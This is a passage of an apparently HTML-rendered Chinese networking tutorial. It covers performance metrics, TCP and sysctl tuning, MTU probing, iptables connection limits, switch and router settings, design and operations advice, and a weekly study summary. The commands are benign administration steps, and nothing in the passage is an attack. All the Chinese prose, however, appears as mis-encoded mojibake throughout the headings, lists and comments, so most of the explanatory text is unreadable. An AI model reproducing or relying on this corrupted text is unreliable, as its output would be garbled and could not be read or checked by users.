id="4-1-ç½‘ç»œæ€§èƒ½æŒ‡æ ‡"><a href="#4-1-ç½‘ç»œæ€§èƒ½æŒ‡æ ‡" class="headerlink" title="4.1 ç½‘ç»œæ€§èƒ½æŒ‡æ ‡"></a>4.1 ç½‘ç»œæ€§èƒ½æŒ‡æ ‡</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å…³é”®æ€§èƒ½æŒ‡æ ‡ï¼ˆKPIï¼‰ï¼š<br><br><span class="hljs-bullet">1.</span> å¸¦å®½ï¼ˆBandwidthï¼‰<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šå•ä½æ—¶é—´ä¼ è¾“çš„æ•°æ®é‡<br><span class="hljs-bullet">   -</span> å•ä½ï¼šbps, Mbps, Gbps<br><span class="hljs-bullet">   -</span> æµ‹è¯•å·¥å…·ï¼šiperf, speedtest<br><br><span class="hljs-bullet">2.</span> å»¶è¿Ÿï¼ˆLatency/RTTï¼‰<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šæ•°æ®å¾€è¿”æ—¶é—´<br><span class="hljs-bullet">   -</span> å•ä½ï¼šmsï¼ˆæ¯«ç§’ï¼‰<br><span class="hljs-bullet">   -</span> è¯„ä»·æ ‡å‡†ï¼š<br><span class="hljs-bullet">     *</span> &lt;50msï¼šä¼˜ç§€<br><span class="hljs-bullet">     *</span> 50-100msï¼šè‰¯å¥½<br><span class="hljs-bullet">     *</span> 100-200msï¼šä¸€èˆ¬<br><span class="hljs-bullet">     *</span> &gt;200msï¼šè¾ƒå·®<br><span class="hljs-bullet">   -</span> æµ‹è¯•å·¥å…·ï¼šping<br><br><span class="hljs-bullet">3.</span> æŠ–åŠ¨ï¼ˆJitterï¼‰<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šå»¶è¿Ÿçš„å˜åŒ–<br><span class="hljs-bullet">   -</span> å•ä½ï¼šms<br><span class="hljs-bullet">   -</span> è¯„ä»·æ ‡å‡†ï¼š<br><span class="hljs-bullet">     *</span> &lt;10msï¼šä¼˜ç§€<br><span class="hljs-bullet">     *</span> 10-30msï¼šè‰¯å¥½<br><span class="hljs-bullet">     *</span> &gt;30msï¼šéœ€è¦ä¼˜åŒ–<br><span class="hljs-bullet">   -</span> å½±å“ï¼šå®æ—¶åº”ç”¨ï¼ˆVoIPã€è§†é¢‘ä¼šè®®ï¼‰<br><br><span class="hljs-bullet">4.</span> ä¸¢åŒ…ç‡ï¼ˆPacket Lossï¼‰<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šä¸¢å¤±æ•°æ®åŒ…çš„æ¯”ä¾‹<br><span class="hljs-bullet">   -</span> å•ä½ï¼š%<br><span class="hljs-bullet">   -</span> è¯„ä»·æ ‡å‡†ï¼š<br><span class="hljs-bullet">     *</span> &lt;0.1%ï¼šä¼˜ç§€<br><span class="hljs-bullet">     *</span> 0.1-1%ï¼šè‰¯å¥½<br><span class="hljs-bullet">     *</span> 1-3%ï¼šä¸€èˆ¬<br><span class="hljs-bullet">     *</span> &gt;3%ï¼šè¾ƒå·®<br><span class="hljs-bullet">   -</span> æµ‹è¯•å·¥å…·ï¼šping -c 1000<br><br><span class="hljs-bullet">5.</span> ååé‡ï¼ˆThroughputï¼‰<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šå®é™…ä¼ è¾“é€Ÿç‡<br><span class="hljs-bullet">   -</span> é€šå¸¸ä½äºå¸¦å®½ï¼ˆåè®®å¼€é”€ï¼‰<br><span class="hljs-bullet">   -</span> æµ‹è¯•å·¥å…·ï¼šiperf<br><br><span class="hljs-bullet">6.</span> å¹¶å‘è¿æ¥æ•°<br><span class="hljs-bullet">   -</span> å®šä¹‰ï¼šåŒæ—¶æ´»è·ƒçš„è¿æ¥æ•°<br><span class="hljs-bullet">   -</span> å½±å“æœåŠ¡å™¨æ€§èƒ½<br><span class="hljs-bullet">   -</span> æŸ¥çœ‹ï¼šnetstat -an | wc -l<br></code></pre></td></tr></table></figure><h3 id="4-2-ä¼˜åŒ–æŠ€å·§"><a href="#4-2-ä¼˜åŒ–æŠ€å·§" class="headerlink" title="4.2 ä¼˜åŒ–æŠ€å·§"></a>4.2 ä¼˜åŒ–æŠ€å·§</h3><p><strong>å®¢æˆ·ç«¯ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1. TCPå‚æ•°è°ƒä¼˜<br><span class="hljs-comment"># Linux</span><br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_window_scaling</span>=1<br>sudo sysctl -w net.core.<span class="hljs-attribute">rmem_max</span>=16777216<br>sudo sysctl -w net.core.<span class="hljs-attribute">wmem_max</span>=16777216<br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_rmem</span>=<span class="hljs-string">&#x27;4096 87380 16777216&#x27;</span><br>sudo sysctl -w net.ipv4.<span class="hljs-attribute">tcp_wmem</span>=<span class="hljs-string">&#x27;4096 65536 16777216&#x27;</span><br><br>2. ç¦ç”¨ä¸éœ€è¦çš„æœåŠ¡<br><span class="hljs-comment"># å‡å°‘ç½‘ç»œå¼€é”€</span><br>sudo systemctl <span class="hljs-built_in">disable</span> bluetooth<br>sudo systemctl <span class="hljs-built_in">disable</span> avahi-daemon<br><br>3. DNSä¼˜åŒ–<br><span class="hljs-comment"># ä½¿ç”¨å¿«é€ŸDNSæœåŠ¡å™¨</span><br>nameserver 1.1.1.1      # Cloudflare<br>nameserver 8.8.8.8      # Google<br>nameserver 114.114.114.114  # 114DNS<br><br><span class="hljs-comment"># DNSç¼“å­˜</span><br>sudo systemctl <span class="hljs-built_in">enable</span> systemd-resolved<br><br>4. MTUä¼˜åŒ–<br><span class="hljs-comment"># æŸ¥æ‰¾æœ€ä½³MTU</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">ping </span>-M <span class="hljs-keyword">do</span> -s 1472 ç›®æ ‡IP<br><span class="hljs-comment"># å¦‚æœæˆåŠŸï¼ŒMTU = 1472 + 28 = 1500ï¼ˆæœ€ä½³ï¼‰</span><br><span class="hljs-comment"># å¦‚æœå¤±è´¥ï¼Œå‡å°1472ç›´åˆ°æˆåŠŸ</span><br><br><span class="hljs-comment"># è®¾ç½®MTU</span><br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> dev eth0 mtu 1500<br><br>5. è¿æ¥æ•°ä¼˜åŒ–<br><span class="hljs-comment"># å¢åŠ è¿æ¥æ•°é™åˆ¶</span><br>ulimit -n 65535<br><br><span class="hljs-comment"># æ°¸ä¹…é…ç½® /etc/security/limits.conf</span><br>* soft nofile 65535<br>* hard nofile 65535<br></code></pre></td></tr></table></figure><p><strong>æœåŠ¡å™¨ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">1</span>. ç½‘ç»œæ ˆä¼˜åŒ–<br><span class="hljs-comment"># /etc/sysctl.conf</span><br><br><span class="hljs-comment"># TCPè¿æ¥é˜Ÿåˆ—</span><br><span class="hljs-string">net</span>.<span class="hljs-string">core</span>.<span class="hljs-string">somaxconn</span> = <span class="hljs-string">65535</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_max_syn_backlog</span> = <span class="hljs-string">8192</span><br><br><span class="hljs-comment"># TCP TIME_WAITé‡ç”¨</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_tw_reuse</span> = <span class="hljs-string">1</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_fin_timeout</span> = <span class="hljs-string">30</span><br><br><span class="hljs-comment"># TCP KeepAlive</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_time</span> = <span class="hljs-string">600</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_probes</span> = <span class="hljs-string">3</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_keepalive_intvl</span> = <span class="hljs-string">15</span><br><br><span class="hljs-comment"># TCPå¿«é€Ÿæ‰“å¼€</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_fastopen</span> = <span class="hljs-string">3</span><br><br><span class="hljs-comment"># å¯ç”¨BBRæ‹¥å¡æ§åˆ¶</span><br><span class="hljs-string">net</span>.<span class="hljs-string">core</span>.<span class="hljs-string">default_qdisc</span> = <span class="hljs-string">fq</span><br><span class="hljs-string">net</span>.<span class="hljs-string">ipv4</span>.<span class="hljs-string">tcp_congestion_control</span> = <span class="hljs-string">bbr</span><br><br>åº”ç”¨é…ç½®ï¼š<br><span class="hljs-string">sudo</span> <span class="hljs-string">sysctl</span> -<span class="hljs-string">p</span><br><br><span class="hljs-string">2</span>. é˜²ç«å¢™ä¼˜åŒ–<br><span class="hljs-comment"># ä½¿ç”¨è¿æ¥è¿½è¸ªé™åˆ¶</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">m</span> <span class="hljs-string">conntrack</span> <span class="hljs-built_in">--ctstate</span> <span class="hljs-string">ESTABLISHED</span>,<span class="hljs-string">RELATED</span> -<span class="hljs-string">j</span> <span class="hljs-string">ACCEPT</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">m</span> <span class="hljs-string">conntrack</span> <span class="hljs-built_in">--ctstate</span> <span class="hljs-string">INVALID</span> -<span class="hljs-string">j</span> <span class="hljs-string">DROP</span><br><br><span class="hljs-comment"># é™åˆ¶æ–°è¿æ¥é€Ÿç‡</span><br><span class="hljs-string">iptables</span> -<span class="hljs-string">A</span> <span class="hljs-string">INPUT</span> -<span class="hljs-string">p</span> <span class="hljs-string">tcp</span> <span class="hljs-built_in">--dport</span> <span class="hljs-string">80</span> -<span class="hljs-string">m</span> <span class="hljs-string">connlimit</span> <span class="hljs-built_in">--connlimit-above</span> <span class="hljs-string">20</span> -<span class="hljs-string">j</span> <span class="hljs-string">REJECT</span><br><br><span class="hljs-string">3</span>. è´Ÿè½½å‡è¡¡<br><span class="hljs-comment"># ä½¿ç”¨Nginx/HAProxy</span><br><span class="hljs-comment"># DNSè½®è¯¢</span><br><span class="hljs-comment"># ç¡¬ä»¶è´Ÿè½½å‡è¡¡å™¨</span><br><br><span class="hljs-string">4</span>. <span class="hljs-string">CDN</span>åŠ é€Ÿ<br><span class="hljs-comment"># é™æ€èµ„æºä½¿ç”¨CDN</span><br><span class="hljs-comment"># å‡å°‘å»¶è¿Ÿ</span><br><span class="hljs-comment"># å‡è½»æœåŠ¡å™¨å‹åŠ›</span><br><br><span class="hljs-string">5</span>. ç¼“å­˜ç­–ç•¥<br><span class="hljs-comment"># Redis/Memcached</span><br><span class="hljs-comment"># å‡å°‘æ•°æ®åº“æŸ¥è¯¢</span><br><span class="hljs-comment"># æé«˜å“åº”é€Ÿåº¦</span><br></code></pre></td></tr></table></figure><p><strong>ç½‘ç»œè®¾å¤‡ä¼˜åŒ–</strong>ï¼š</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span> äº¤æ¢æœºä¼˜åŒ–<br><span class="hljs-meta"># å¯ç”¨æµæ§</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># flowcontrol send on</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># flowcontrol receive on</span><br><br><span class="hljs-meta"># QoSé…ç½®</span><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># mls qos</span><br><br><span class="hljs-meta"># ç«¯å£èšåˆï¼ˆå¢åŠ å¸¦å®½ï¼‰</span><br><span class="hljs-keyword">Switch</span>(config)<span class="hljs-meta"># interface port-channel 1</span><br><span class="hljs-keyword">Switch</span>(config-<span class="hljs-keyword">if</span>)<span class="hljs-meta"># switchport mode trunk</span><br><br><span class="hljs-number">2.</span> è·¯ç”±å™¨ä¼˜åŒ–<br><span class="hljs-meta"># è·¯ç”±æ±‡æ€»ï¼ˆå‡å°‘è·¯ç”±è¡¨ï¼‰</span><br>Router(config-router)<span class="hljs-meta"># area 0 range 192.168.0.0 255.255.0.0</span><br><br><span class="hljs-meta"># å¯ç”¨CEFï¼ˆå¿«é€Ÿè½¬å‘ï¼‰</span><br>Router(config)<span class="hljs-meta"># ip cef</span><br><br><span class="hljs-meta"># è°ƒæ•´è·¯ç”±åè®®å®šæ—¶å™¨</span><br>Router(config-router)<span class="hljs-meta"># timers basic 5 15 15 10</span><br><br><span class="hljs-number">3.</span> æ— çº¿ç½‘ç»œä¼˜åŒ–<br><span class="hljs-meta"># é€‰æ‹©åˆé€‚ä¿¡é“ï¼ˆé¿å…å¹²æ‰°ï¼‰</span><br><span class="hljs-meta"># ä½¿ç”¨5GHzé¢‘æ®µ</span><br><span class="hljs-meta"># å¯ç”¨802.11ac/ax</span><br><span class="hljs-meta"># åˆç†æ”¾ç½®AP</span><br><span class="hljs-meta"># è°ƒæ•´å‘å°„åŠŸç‡</span><br></code></pre></td></tr></table></figure><hr><h2 id="5-æœ€ä½³å®è·µ"><a href="#5-æœ€ä½³å®è·µ" class="headerlink" title="5. æœ€ä½³å®è·µ"></a>5. æœ€ä½³å®è·µ</h2><h3 id="5-1-ç½‘ç»œè®¾è®¡åŸåˆ™"><a href="#5-1-ç½‘ç»œè®¾è®¡åŸåˆ™" class="headerlink" title="5.1 ç½‘ç»œè®¾è®¡åŸåˆ™"></a>5.1 ç½‘ç»œè®¾è®¡åŸåˆ™</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> å±‚æ¬¡åŒ–è®¾è®¡<br>   æ¥å…¥å±‚ â†’ æ±‡èšå±‚ â†’ æ ¸å¿ƒå±‚<br><span class="hljs-bullet">   -</span> æ¸…æ™°çš„å±‚æ¬¡<br><span class="hljs-bullet">   -</span> æ˜“äºç®¡ç†<br><span class="hljs-bullet">   -</span> æ˜“äºæ‰©å±•<br><br><span class="hljs-bullet">2.</span> å†—ä½™å’Œé«˜å¯ç”¨<br><span class="hljs-bullet">   -</span> åŒé“¾è·¯<br><span class="hljs-bullet">   -</span> åŒè®¾å¤‡<br><span class="hljs-bullet">   -</span> åŒç”µæº<br><span class="hljs-bullet">   -</span> å¿«é€Ÿåˆ‡æ¢<br><br><span class="hljs-bullet">3.</span> å®‰å…¨æ€§<br><span class="hljs-bullet">   -</span> è®¿é—®æ§åˆ¶ï¼ˆACLï¼‰<br><span class="hljs-bullet">   -</span> é˜²ç«å¢™<br><span class="hljs-bullet">   -</span> IDS/IPS<br><span class="hljs-bullet">   -</span> åŠ å¯†é€šä¿¡<br><br><span class="hljs-bullet">4.</span> å¯æ‰©å±•æ€§<br><span class="hljs-bullet">   -</span> é¢„ç•™åœ°å€ç©ºé—´<br><span class="hljs-bullet">   -</span> æ¨¡å—åŒ–è®¾è®¡<br><span class="hljs-bullet">   -</span> æ ‡å‡†åŒ–é…ç½®<br><br><span class="hljs-bullet">5.</span> æ€§èƒ½<br><span class="hljs-bullet">   -</span> åˆç†å¸¦å®½<br><span class="hljs-bullet">   -</span> QoSç­–ç•¥<br><span class="hljs-bullet">   -</span> è´Ÿè½½å‡è¡¡<br><br><span class="hljs-bullet">6.</span> å¯ç®¡ç†æ€§<br><span class="hljs-bullet">   -</span> é›†ä¸­ç®¡ç†<br><span class="hljs-bullet">   -</span> ç›‘æ§å‘Šè­¦<br><span class="hljs-bullet">   -</span> æ—¥å¿—è®°å½•<br><span class="hljs-bullet">   -</span> æ–‡æ¡£å®Œå–„<br></code></pre></td></tr></table></figure><h3 id="5-2-è¿ç»´å»ºè®®"><a href="#5-2-è¿ç»´å»ºè®®" class="headerlink" title="5.2 è¿ç»´å»ºè®®"></a>5.2 è¿ç»´å»ºè®®</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ—¥å¸¸ç»´æŠ¤<br>   âœ… å®šæœŸæ£€æŸ¥è®¾å¤‡çŠ¶æ€<br>   âœ… ç›‘æ§ç½‘ç»œæµé‡<br>   âœ… æ›´æ–°å›ºä»¶å’Œè¡¥ä¸<br>   âœ… å¤‡ä»½é…ç½®<br>   âœ… æ¸…ç†æ—¥å¿—<br><br><span class="hljs-bullet">2.</span> ç›‘æ§å‘Šè­¦<br>   âœ… æµé‡å¼‚å¸¸å‘Šè­¦<br>   âœ… è®¾å¤‡æ•…éšœå‘Šè­¦<br>   âœ… æ€§èƒ½ä¸‹é™å‘Šè­¦<br>   âœ… å®‰å…¨äº‹ä»¶å‘Šè­¦<br><br><span class="hljs-bullet">3.</span> æ–‡æ¡£ç®¡ç†<br>   âœ… ç½‘ç»œæ‹“æ‰‘å›¾<br>   âœ… IPåœ°å€åˆ†é…è¡¨<br>   âœ… è®¾å¤‡é…ç½®æ–‡æ¡£<br>   âœ… æ•…éšœå¤„ç†è®°å½•<br>   âœ… å˜æ›´è®°å½•<br><br><span class="hljs-bullet">4.</span> å˜æ›´ç®¡ç†<br>   âœ… å˜æ›´å‰è¯„ä¼°<br>   âœ… å˜æ›´è®¡åˆ’<br>   âœ… å›æ»šæ–¹æ¡ˆ<br>   âœ… å˜æ›´æµ‹è¯•<br>   âœ… å˜æ›´è®°å½•<br><br><span class="hljs-bullet">5.</span> åº”æ€¥å“åº”<br>   âœ… åº”æ€¥é¢„æ¡ˆ<br>   âœ… è”ç³»æ¸…å•<br>   âœ… å¤‡ç”¨è®¾å¤‡<br>   âœ… å¿«é€Ÿæ¢å¤æµç¨‹<br></code></pre></td></tr></table></figure><hr><h2 id="6-æœ¬å‘¨æ€»ç»“"><a href="#6-æœ¬å‘¨æ€»ç»“" class="headerlink" title="6. æœ¬å‘¨æ€»ç»“"></a>6. æœ¬å‘¨æ€»ç»“</h2><h3 id="6-1-å­¦ä¹ æˆæœ"><a href="#6-1-å­¦ä¹ æˆæœ" class="headerlink" title="6.1 å­¦ä¹ æˆæœ"></a>6.1 å­¦ä¹ æˆæœ</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">æœ¬å‘¨å®Œæˆå†…å®¹ï¼š</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Day 22</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IPåè®®åŸºç¡€</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv4åœ°å€å’Œå­ç½‘åˆ’åˆ†</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPæ•°æ®åŒ…æ ¼å¼</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">NATæŠ€æœ¯</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®ç°IPåœ°å€è®¡ç®—å™¨</span><br><br><span class="hljs-attribute">Day 23</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IPv6è¯¦è§£</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6åœ°å€æ ¼å¼</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6ç‰¹æ€§å’Œä¼˜åŠ¿</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">IPv6è¿‡æ¸¡æŠ€æœ¯</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®ç°IPv6åœ°å€å·¥å…·</span><br><br><span class="hljs-attribute">Day 24</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ICMPå’Œè¯Šæ–­å·¥å…·</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ICMPåè®®åŸç†</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">pingå’Œtracerouteå®ç°</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ç½‘ç»œè¯Šæ–­æ–¹æ³•</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®ç°è¯Šæ–­å·¥å…·å¥—ä»¶</span><br><br><span class="hljs-attribute">Day 25</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ARPåè®®å’Œé“¾è·¯å±‚</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ARPå·¥ä½œåŸç†</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">ARPå®‰å…¨é—®é¢˜</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">MACåœ°å€å’Œä»¥å¤ªç½‘</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®ç°ARPå·¥å…·</span><br><br><span class="hljs-attribute">Day 26</span><span class="hljs-punctuation">:</span> <span class="hljs-string">è·¯ç”±åè®®åŸºç¡€</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">è·¯ç”±è¡¨å’Œè·¯ç”±æŸ¥æ‰¾</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">é™æ€è·¯ç”±é…ç½®</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">RIPå’ŒOSPFåè®®</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®ç°è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨</span><br><br><span class="hljs-attribute">Day 27</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ç»¼åˆå®æˆ˜</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">çŸ¥è¯†ç‚¹æ•´åˆ</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">å®æˆ˜é¡¹ç›®</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æ’é”™æ¡ˆä¾‹</span><br><span class="hljs-bullet">-</span> <span class="hljs-string">æ€§èƒ½ä¼˜åŒ–</span><br></code></pre></td></tr></table></figure><h3 id="6-2-æŠ€èƒ½æå‡"><a href="#6-2-æŠ€èƒ½æå‡" class="headerlink" title="6.2 æŠ€èƒ½æå‡"></a>6.2 æŠ€èƒ½æå‡</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">æŒæ¡çš„æŠ€èƒ½ï¼š<br><br><span class="hljs-bullet">1.</span> åè®®ç†è§£<br>   âœ… æ·±å…¥ç†è§£ç½‘ç»œå±‚åè®®<br>   âœ… æŒæ¡IPã€ICMPã€ARP<br>   âœ… äº†è§£è·¯ç”±åè®®<br><br><span class="hljs-bullet">2.</span> å·¥å…·ä½¿ç”¨<br>   âœ… pingã€traceroute<br>   âœ… arpã€route<br>   âœ… tcpdumpã€wireshark<br>   âœ… ipã€ifconfig<br><br><span class="hljs-bullet">3.</span> ç¼–ç¨‹èƒ½åŠ›<br>   âœ… åŸå§‹å¥—æ¥å­—ç¼–ç¨‹<br>   âœ… ç½‘ç»œåè®®å®ç°<br>   âœ… æ•°æ®åŒ…æ„é€ å’Œè§£æ<br><br><span class="hljs-bullet">4.</span> æ’é”™èƒ½åŠ›<br>   âœ… ç³»ç»ŸåŒ–æ’é”™æ–¹æ³•<br>   âœ… ä½¿ç”¨è¯Šæ–­å·¥å…·<br>   